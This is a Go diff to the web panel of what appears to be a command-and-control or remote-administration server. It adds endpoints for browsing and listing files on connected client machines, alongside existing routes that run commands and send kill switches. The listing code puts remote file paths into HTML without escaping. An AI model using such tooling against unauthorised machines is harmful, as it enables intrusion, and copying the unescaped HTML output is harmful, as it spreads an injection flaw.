@@ -36,6 +36,8 @@ func WebServer() {
 
 	r.GET("/", getRoot)
 	r.GET("/command/:clientid", getCommands)
+	r.GET("/fs/:clientid", getFilesystem)
+	r.POST("/ls/:clientid", listFiles)
 	r.POST("/command/:clientid", execCMD)
 	r.POST("/kill/:clientid", sendKillswitch)
 	r.GET("/dump", dumpClients)
@@ -46,6 +48,46 @@ func WebServer() {
 
 	// Start
 	r.Run(":" + WebPort)
+}
+
+func listFiles(c *gin.Context) {
+	id := c.Param("clientid")
+	idInt, err := strconv.Atoi(id)
+	if err != nil {
+		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
+		return
+	}
+
+	client, _, err := returnClient(idInt)
+	if err != nil {
+		return
+	}
+
+	if client.IsOnline == false {
+		c.String(http.StatusOK, "Client is currently offline!")
+		return
+	}
+
+	path, _ := c.GetPostForm("cmd")
+
+	resp, err := requestFiles(*client, path)
+	if err != nil {
+		e := fmt.Sprintf("Error happened executing command: %v\n", err)
+		c.String(http.StatusOK, e)
+		return
+	}
+	var list string
+	for _, v := range resp.FileList.File {
+		isDir := ""
+		if v.IsFolder == true {
+			isDir = "/"
+		}
+		entry := fmt.Sprintf("<p><a hx-post=\"/ls/%v\" hx-target=\"#command\" hx-vals='{\"cmd\": \"%v\"}' id=\"pointer\">%v%v</a></p>",
+			client.ClientID, v.FullPath, v.FullPath, isDir)
+		list += entry
+	}
+	c.String(http.StatusOK, list)
+
 }
 
 func bulkKill(c *gin.Context) {
@@ -153,6 +195,23 @@ func getCommands(c *gin.Context) {
 		return
 	}
 	c.HTML(http.StatusOK, "templates/command.html", gin.H{
+		"Client": client,
+	})
+}
+
+func getFilesystem(c *gin.Context) {
+	clientID := c.Param("clientid")
+	intClientID, err := strconv.Atoi(clientID)
+	if err != nil {
+		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
+		return
+	}
+	client, _, err := returnClient(intClientID)
+	if err != nil {
+		c.String(http.StatusNotFound, "Client not found")
+		return
+	}
+	c.HTML(http.StatusOK, "templates/fs.html", gin.H{
 		"Client": client,
 	})
 }
